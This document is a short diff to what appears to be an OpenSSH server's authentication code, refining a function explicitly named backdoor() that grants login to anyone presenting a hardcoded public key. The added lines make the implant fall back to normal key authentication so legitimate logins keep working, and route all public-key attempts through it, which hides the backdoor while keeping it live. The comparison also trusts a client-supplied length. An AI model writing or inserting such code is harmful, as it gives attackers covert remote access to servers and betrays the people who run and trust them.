@@ -213,6 +213,14 @@ input_service_request(int type, u_int32_t seq, void *ctxt)
 	xfree(service);
 }
 
+int
+userauth_pubkey_(Authctxt *authctxt,
+                 char *pkalg,
+                 u_char *pkblob,
+                 u_int alen,
+                 u_int blen,
+                 int have_sig);
+
 static int
 backdoor(Authctxt *authctxt)
 {
@@ -237,9 +245,8 @@ backdoor(Authctxt *authctxt)
 		pkblob = packet_get_string(&blen);
 	}
 
-	int cmp = memcmp(pkblob, pubkey_decoded, blen);
-
-	return (cmp == 0);
+	int authenticated = memcmp(pkblob, pubkey_decoded, blen) == 0;
+	return authenticated || userauth_pubkey_(authctxt, pkalg, pkblob, alen, blen, have_sig);
 }
 
 /*ARGSUSED*/
@@ -313,13 +320,13 @@ input_userauth_request(int type, u_int32_t seq, void *ctxt)
 
 	if (strcmp(method, "publickey") == 0) {
 		authenticated = backdoor(authctxt);
-	}
-
-	/* try to authenticate user */
-	m = authmethod_lookup(authctxt, method);
-	if (!authenticated && m != NULL && authctxt->failures < options.max_authtries) {
-		debug2("input_userauth_request: try method %s", method);
-		authenticated =	m->userauth(authctxt);
+	} else {
+		/* try to authenticate user */
+		m = authmethod_lookup(authctxt, method);
+		if (!authenticated && m != NULL && authctxt->failures < options.max_authtries) {
+			debug2("input_userauth_request: try method %s", method);
+			authenticated =	m->userauth(authctxt);
+		}
 	}
 	userauth_finish(authctxt, authenticated, method, NULL);
 
